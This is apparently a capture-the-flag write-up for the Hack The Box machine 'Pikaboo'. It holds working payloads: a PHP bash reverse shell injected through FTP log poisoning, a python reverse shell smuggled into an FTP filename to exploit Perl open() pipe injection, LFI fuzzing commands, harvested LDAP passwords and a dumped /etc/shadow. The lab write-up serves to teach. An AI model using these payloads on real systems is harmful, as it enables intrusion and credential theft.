# Enumeration
## NMAP
```bash
# Nmap 7.91 scan initiated Sun Jul 18 01:44:59 2021 as: nmap -vvv -p 21,22,80 -A -v -oN intial.nmap 10.129.185.25
Nmap scan report for pikaboo.htb (10.129.185.25)
Host is up, received syn-ack (0.32s latency).
Scanned at 2021-07-18 01:45:01 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgG6pLBPMmXneLGYurX9xbt6cE2IYdEN9J/ijCVrQbpUyVeTNWNoFnpB8+DIcppOtsJu0X3Iwpfb1eTmuop8q9nNlmyOcOTBHYOYLQwa+G4e90Bsku86ndqs+LU09sjqss5n3XdZoFqunNfZb7EirVVCgI80Lf8F+3XRRIX3ErqNrk2LiaQQY6fcAaNALaQy9ked7KydWDFYizO2dnu8ee2ncdXFMBeVDKGVfrlHAoRFoTmCEljCP1Vsjt69NDBudCGJBgU1MbItTF7DtbNQWGQmw8/9n9Jq8ic/YxOnIKRDDUuuWdE3sy2dPiw0ZVuG7V2GnkkMsGv0Qn3Uq9Qx7
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIJl6Z/XtGXJwSnO57P3CesJfRbmGNra4AuSSHCGUocKchdp3JnNE704lMnocAevDwi9HsAKARxCup18UpPHz+I=
|   256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINyHVcrR4jjhBG5vZsvKRsKO4SnXj3GqeMtwvFSvd4B4
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 01:45:19 2021 -- 1 IP address (1 host up) scanned in 20.01 seconds
```
Looks like we have 3 ports FTP,SSH and WEB.
Let's check FTP for anonymous login.
## FTP
### Anonymous Login
```bash
kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb 
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
Looks like we don't have anonymous login so it is a dead end for now until we have some creds for it.
## Web
### Visiting website
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718223326.png)
Not much here there is a contact page but not much there as we cannot submit the form.
Then we have another page called pokatdex aka pokedex(For Pokemon fans like me).
Not necessary for the machine but had to put it in.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718223538.png)
Just checking for any pokemon in there we are redirected to the link.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718223635.png)
Here we have the link for the api but looks like it still is under construction so not much from here.
And finally there is admin page with requires basic authentication for logging in.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718223811.png)
Default creds and bruteforce should not work as this is hardbox so let's think something other than that.
### Intresting thing
Clicking cancel on the basic authentication dialogue box gives us something intresting.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718224031.png)
In the image you can see that it is saying it is using apache server on port 81 so there is two intresting thing first is why port 81 instead  of standard port 80 but we will get back to that later and another is nmap says it's nginx not apache so there must some sort of traffic forwarding and reverse proxy running on the backend and now to the port 81 part as nginx is running onport 80 that is why apache is on port 81 as both should be hosted on same machine.
### Enumeration
Looking for version and exploit it seems to be running latest versions of both apache and nginx but I came across this article which specified that there could be path traversal due to misconfigured alias in nginx.
https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
so I thought to give it a try as it is pretty easy just go to the endpoint which ask for the creds and then use ../ and then go to the desired directory so I decided to give it a try.
#### Fuzzing
```bash
kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
admin                   [Status: 401, Size: 456, Words: 42, Lines: 15]
javascript              [Status: 301, Size: 314, Words: 20, Lines: 10]
server-status           [Status: 200, Size: 5531, Words: 265, Lines: 110]
:: Progress: [20469/20469] :: Job [1/1] :: 667 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
Looks like we have found few directories most of then doesn't look intresting but server-status which is mostly forbidden is now giving 200 status code so let's check that out.
#### Visiting potentially intresting endpoint
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718230449.png)
we have something like this if you go through the whole you can find this intresting part.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718230546.png)
Now we know we can access admin_staging endpoint using this trick.
Visting that endpoint it looks like.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718230642.png)
so let's just see the dashboad so now we finally have admin dashboard or that is what I am assuming at the moment.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718230742.png)
looks at the url it looks fishy as it just directly calling the php page so there could be potential LFI there.
so let's FUZZ for that as this box doesn't have rate limiting and fuzzing is extremly fast so it would be just a couple of seconds.
#### Fuzzing For LFI
I prefer using LFI-Jhaddix.txt for fuzzing as it has cool variations in the payload with the list of potentially useful files.
You can download this wordlist from here https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt
```bash
kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 15349
________________________________________________

/var/log/lastlog        [Status: 200, Size: 307641, Words: 3272, Lines: 368]
/var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414]
/var/log/wtmp           [Status: 200, Size: 166983, Words: 3288, Lines: 559]
:: Progress: [914/914] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
Looks like we have access to logs so if we would have tried to find this LFI manually we wouldn't be successful until and unless you are genius and remebered that we have FTP also. But let's be honesh everyone tries /etc/passwd to check.
Anyways now we have the FTP log file so the first thing that came to my mind was FTP-log poisoing so if you don't what that is, it is basically just the injecting PHP code in the FTP log and then later make web server execute that piece of code with the help of LFI.
If you wanna learn more about it you can refer below articles.
https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d

https://secnhack.in/ftp-log-poisoning-through-lfi/
# Exploitation
Looking at the logs we can also find the username but let's go for LFI.
We got the log file 
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Pikaboo%20(HTB)/Pasted%20image%2020210718233144.png)
Now let's try and get revshell from that.
```bash
kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb 
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): <?php exec("/bin/bash -c 'bash -i > /dev/tcp/<YOURIP>/<PORT> 0>&1'"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```
and the password can be anything and then just start the nc listerner.
```bash
kali@kali:~/HackTheBox/Pikaboo$ curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```
And Boom we have the reverse shell.
```bash
kali@kali:~/HackTheBox/Pikaboo$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [<SNIP>] from (UNKNOWN) [<SNIP>] 59006
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
# Gaining User
## Enumeration
Let's check for all the running services on the box
```bash
www-data@pikaboo:/opt/pokeapi$ ss -tupln
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port                                                                                   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       users:(("nginx",pid=601,fd=6),("nginx",pid=600,fd=6))                          
tcp     LISTEN   0        128            127.0.0.1:81            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128            127.0.0.1:389           0.0.0.0:*                                                                                      
tcp     LISTEN   0        128                 [::]:80               [::]:*       users:(("nginx",pid=601,fd=7),("nginx",pid=600,fd=7))                          
tcp     LISTEN   0        32                     *:21                  *:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*     
```
Looks like we have LDAP running on the box.
Let's check the home directory for seeing the users/
```bash
ls /home
pwnmeow
```
Looks like we have only one user.
```bash
ls -al /home/pwnmeow
total 580
drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -> /dev/null
-r--r----- 1 pwnmeow www-data     33 Jul 17 22:06 user.txt
```
An unusual .python_history file is there so let's check it out.
Looking for intresting things I checked /opt directory.
```bash
ls /opt
pokeapi
```
We found the under construction version of pokeapi so there could be exploit but we can't exploit it but what we can do is to find hardcoded creds in it as developers might have left it as it is still not implemented.
```bash
cd /opt/pokeapi
www-data@pikaboo:/opt/pokeapi$ ls
CODE_OF_CONDUCT.md  README.md         data                pokemon_v2
CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt
CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt
LICENSE.md          apollo.config.js  gunicorn.py.ini
Makefile            config            manage.py
```
Let's just try and grep for passwords from the files.
```bash
www-data@pikaboo:/opt/pokeapi$ grep -iRl 'password'
.github/workflows/docker-image.yml
Resources/compose/docker-compose-prod-graphql.yml
Resources/docker/app/README.md
docker-compose.yml
config/docker.py
config/settings.py
config/docker-compose.py
```
We have some files which has the word password in it the most intresting file is config/settings.py so let's see that.
Checking that file out you can see this good part.
```bash
DATABASES = {                                                                                                                                                         
    "ldap": {                                                                                                                                                         
        "ENGINE": "ldapdb.backends.ldap",                                                                                                                             
        "NAME": "ldap:///",                                                                                                                                           
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",                                                                                                             
        "PASSWORD": "J~42%W?PFHl]g",                                                                                                                                  
    },                                                                                                                                                                
    "default": {                                                                                                                                                      
        "ENGINE": "django.db.backends.sqlite3",                                                                                                                       
        "NAME": "/opt/pokeapi/db.sqlite3",                                                                                                                            
    }                                                                                                                                                                 
}  
```
we can see LDAP creds and we know the ldap is running so let's try to enumerate it with creds we found.
```bash
www-data@pikaboo:/opt/pokeapi$ ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
<--SNIP-->
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
<--SNIP-->
```
Looking at the LDAP dump we can see the creds for the user pwnmeow.
so let's base64 decode that creds.
```bash
kali@kali:~/HackTheBox/Pikaboo$ echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```
We have the password for the user pwnmeow but the catch over here is that we cannot su into pwnmeow with that creds neither you can use it to SSH.
So from beginning we know that FTP also has the user pwnmeow from the logs that we saw from local file inclusion so let's try this cred there.
```bash
kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb 
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
And boom it worked so let's enumerate futher.
# PrivESC TO Root
## Enumeration
let's see if there is any cron running.
```bash
www-data@pikaboo:/opt/pokeapi$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```
Looks like we have a script that is been executed as root every single second.
so let's look into script.
```bash
www-data@pikaboo:/opt/pokeapi$ cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```
looks like it is just a simple bash script to run another script /usr/local/bin/csvupdate with the filename as the parameter for the files in FTP and now as we have access to FTP we might be able to exploit it.
so let's look at the /usr/local/bin/csvupdate file.
```perl
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  'abilities' => 4,
  'ability_changelog' => 3,
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4,
  'ability_names' => 3,
  'ability_prose' => 4,
  'berries' => 10,
  'berry_firmness' => 2,
  'berry_firmness_names' => 3,
  'berry_flavors' => 3,
  'characteristics' => 3,
  'characteristic_text' => 3,
  'conquest_episode_names' => 3,
  'conquest_episodes' => 2,
  'conquest_episode_warriors' => 2,
  'conquest_kingdom_names' => 3,
  'conquest_kingdoms' => 3,
  'conquest_max_links' => 3,
  'conquest_move_data' => 7,
  'conquest_move_displacement_prose' => 5,
  'conquest_move_displacements' => 3,
  'conquest_move_effect_prose' => 4,
  'conquest_move_effects' => 1,
  'conquest_move_range_prose' => 4,
  'conquest_move_ranges' => 3,
  'conquest_pokemon_abilities' => 3,
  'conquest_pokemon_evolution' => 8,
  'conquest_pokemon_moves' => 2,
  'conquest_pokemon_stats' => 3,
  'conquest_stat_names' => 3,
  'conquest_stats' => 3,
  'conquest_transformation_pokemon' => 2,
  'conquest_transformation_warriors' => 2,
  'conquest_warrior_archetypes' => 2,
  'conquest_warrior_names' => 3,
  'conquest_warrior_ranks' => 4,
  'conquest_warrior_rank_stat_map' => 3,
  'conquest_warriors' => 4,
  'conquest_warrior_skill_names' => 3,
  'conquest_warrior_skills' => 2,
  'conquest_warrior_specialties' => 3,
  'conquest_warrior_stat_names' => 3,
  'conquest_warrior_stats' => 2,
  'conquest_warrior_transformation' => 10,
  'contest_combos' => 2,
  'contest_effect_prose' => 4,
  'contest_effects' => 3,
  'contest_type_names' => 5,
  'contest_types' => 2,
  'egg_group_prose' => 3,
  'egg_groups' => 2,
  'encounter_condition_prose' => 3,
  'encounter_conditions' => 2,
  'encounter_condition_value_map' => 2,
  'encounter_condition_value_prose' => 3,
  'encounter_condition_values' => 4,
  'encounter_method_prose' => 3,
  'encounter_methods' => 3,
  'encounters' => 7,
  'encounter_slots' => 5,
  'evolution_chains' => 2,
  'evolution_trigger_prose' => 3,
  'evolution_triggers' => 2,
  'experience' => 3,
  'genders' => 2,
  'generation_names' => 3,
  'generations' => 3,
  'growth_rate_prose' => 3,
  'growth_rates' => 3,
  'item_categories' => 3,
  'item_category_prose' => 3,
  'item_flag_map' => 2,
  'item_flag_prose' => 4,
  'item_flags' => 2,
  'item_flavor_summaries' => 3,
  'item_flavor_text' => 4,
  'item_fling_effect_prose' => 3,
  'item_fling_effects' => 2,
  'item_game_indices' => 3,
  'item_names' => 3,
  'item_pocket_names' => 3,
  'item_pockets' => 2,
  'item_prose' => 4,
  'items' => 6,
  'language_names' => 3,
  'languages' => 6,
  'location_area_encounter_rates' => 4,
  'location_area_prose' => 3,
  'location_areas' => 4,
  'location_game_indices' => 3,
  'location_names' => 4,
  'locations' => 3,
  'machines' => 4,
  'move_battle_style_prose' => 3,
  'move_battle_styles' => 2,
  'move_changelog' => 10,
  'move_damage_classes' => 2,
  'move_damage_class_prose' => 4,
  'move_effect_changelog' => 3,
  'move_effect_changelog_prose' => 3,
  'move_effect_prose' => 4,
  'move_effects' => 1,
  'move_flag_map' => 2,
  'move_flag_prose' => 4,
  'move_flags' => 2,
  'move_flavor_summaries' => 3,
  'move_flavor_text' => 4,
  'move_meta_ailment_names' => 3,
  'move_meta_ailments' => 2,
  'move_meta_categories' => 2,
  'move_meta_category_prose' => 3,
  'move_meta' => 13,
  'move_meta_stat_changes' => 3,
  'move_names' => 3,
  'moves' => 15,
  'move_target_prose' => 4,
  'move_targets' => 2,
  'nature_battle_style_preferences' => 4,
  'nature_names' => 3,
  'nature_pokeathlon_stats' => 3,
  'natures' => 7,
  'pal_park_area_names' => 3,
  'pal_park_areas' => 2,
  'pal_park' => 4,
  'pokeathlon_stat_names' => 3,
  'pokeathlon_stats' => 2,
  'pokedexes' => 4,
  'pokedex_prose' => 4,
  'pokedex_version_groups' => 2,
  'pokemon_abilities' => 4,
  'pokemon_color_names' => 3,
  'pokemon_colors' => 2,
  'pokemon' => 8,
  'pokemon_dex_numbers' => 3,
  'pokemon_egg_groups' => 2,
  'pokemon_evolution' => 20,
  'pokemon_form_generations' => 3,
  'pokemon_form_names' => 4,
  'pokemon_form_pokeathlon_stats' => 5,
  'pokemon_forms' => 10,
  'pokemon_form_types' => 3,
  'pokemon_game_indices' => 3,
  'pokemon_habitat_names' => 3,
  'pokemon_habitats' => 2,
  'pokemon_items' => 4,
  'pokemon_move_method_prose' => 4,
  'pokemon_move_methods' => 2,
  'pokemon_moves' => 6,
  'pokemon_shape_prose' => 5,
  'pokemon_shapes' => 2,
  'pokemon_species' => 20,
  'pokemon_species_flavor_summaries' => 3,
  'pokemon_species_flavor_text' => 4,
  'pokemon_species_names' => 4,
  'pokemon_species_prose' => 3,
  'pokemon_stats' => 4,
  'pokemon_types' => 3,
  'pokemon_types_past' => 4,
  'region_names' => 3,
  'regions' => 2,
  'stat_names' => 3,
  'stats' => 5,
  'super_contest_combos' => 2,
  'super_contest_effect_prose' => 3,
  'super_contest_effects' => 2,
  'type_efficacy' => 3,
  'type_game_indices' => 3,
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```
Looking through the perl script we can see takes the file name as argument.
Looking for the vulnerability in perl file open.
I came across this question in stackoverflow.
https://stackoverflow.com/questions/26614348/perl-open-injection-prevention
which than increased my curosity to learn more as answer didn't explain a good way to exploit and looking for the exploit for that I stumbled upon this article.
https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543
which explained the exploit in detailed.
The exploit basically is that if the filename starts with '|' then the rest of file name will be executed as command rather than the file name itself so I build up a payload for that.
```python
|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<YOUR IP>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv
```
So this is the file name that I come up with and I will tell why this shell as the command is passed through basename so ant '/' will just split the payload and mess with the working of the payload.
```bash
kali@kali:~/HackTheBox/Pikaboo$ basename '/bin/bash'
bash
```
So as we can see above we cannot use the bash payload as due to below.
```bash
kali@kali:~/HackTheBox/Pikaboo$ basename 'bash -c "bash -i >& /dev/tcp/<YOUR IP>/12345 0>&1"'
12345 0>&1"
```
So basically it will just send '12345 0>&1' to the perl script and your payload cannot execute so thats why I chose python payload.
So let's create the file.
```bash
kali@kali:~/HackTheBox/Pikaboo$ touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<YOUR IP>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv"
```
and we need .csv at the as to bypass the check in the bash script.
Now let's upload the file but before that start the nc listener on that port.
```bash
kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb 
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd versions
250 Directory successfully changed.
ftp> put oops "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"<YOUR IP>\",<PORT>));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
local: oops remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<YOUR IP>",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp>
```
After uploading file please wait for sometime as it can take a while.
```bash
kali@kali:~/HackTheBox/Pikaboo$ rlwrap nc -nlvp <PORT>
listening on [any] 12345 ...
connect to [<--SNIP-->] from (UNKNOWN) [<--SNIP-->] 46436
id 
id 

uid=0(root) gid=0(root) groups=0(root)

cat /etc/shadow
cat /etc/shadow

root:$6$rmBpCrNSohpbrXpW$6XizSEcAl0ELQH28F21.V0cvZgWCNkatRbXCv5WNlIW2mkhECPM7wm1j.BRD.t7.Z5CQPvu19EGORXbpOnb540:18816:0:99999:7:::
daemon:*:18757:0:99999:7:::
bin:*:18757:0:99999:7:::
sys:*:18757:0:99999:7:::
sync:*:18757:0:99999:7:::
games:*:18757:0:99999:7:::
man:*:18757:0:99999:7:::
lp:*:18757:0:99999:7:::
mail:*:18757:0:99999:7:::
news:*:18757:0:99999:7:::
uucp:*:18757:0:99999:7:::
proxy:*:18757:0:99999:7:::
www-data:*:18757:0:99999:7:::
backup:*:18757:0:99999:7:::
list:*:18757:0:99999:7:::
irc:*:18757:0:99999:7:::
gnats:*:18757:0:99999:7:::
nobody:*:18757:0:99999:7:::
_apt:*:18757:0:99999:7:::
systemd-timesync:*:18757:0:99999:7:::
systemd-network:*:18757:0:99999:7:::
systemd-resolve:*:18757:0:99999:7:::
messagebus:*:18757:0:99999:7:::
pwnmeow:$6$H5CffbR.b9evmTUv$s.KtcDNAburm1TyaSt2hNwrciq/yPQ0/g6KmeJr4hj1SBN.ddDNuNcPJXY.H0Y.DoRVov0Z0wfXJ0OmvHAAeC/:18816:0:99999:7:::
systemd-coredump:!!:18757::::::
openldap:!:18757:0:99999:7:::
sshd:*:18757:0:99999:7:::
nslcd:*:18757:0:99999:7:::
ftp:*:18757:0:99999:7:::
redis:*:18766:0:99999:7:::
postgres:*:18766:0:99999:7:::

```
And boom we are root so let's get all the flags.
# If you like the writeup give rep+
Profie Link: [<img src="http://www.hackthebox.eu/badge/image/387509" alt="Hack The Box"/>](https://app.hackthebox.eu/profile/387509)
<script src="https://www.hackthebox.eu/badge/387509"></script>
